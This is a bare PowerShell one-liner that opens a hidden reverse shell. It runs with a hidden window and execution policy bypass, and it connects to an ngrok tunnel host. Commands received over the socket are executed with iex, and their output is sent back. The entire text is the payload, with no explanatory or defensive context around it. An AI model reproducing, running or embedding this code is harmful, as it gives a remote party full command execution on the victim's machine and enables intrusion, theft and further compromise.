powershell -NoP -NonI -W Hidden -Exec Bypass -Command $a=New-Object System.Net.Sockets.TCPClient('0.tcp.au.ngrok.io',19087);$b=$a.GetStream();$c=0..65535|%{0};while(($d=$b.Read($c,0,$c.Length)) -ne 0){$e=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($c,0,$d);$f=(iex $e 2>&1 | Out-String );$f2=$f+'PS '+(pwd).Path+'> ';$g=([text.encoding]::ASCII).GetBytes($f2);$b.Write($g,0,$g.Length);$b.Flush()}
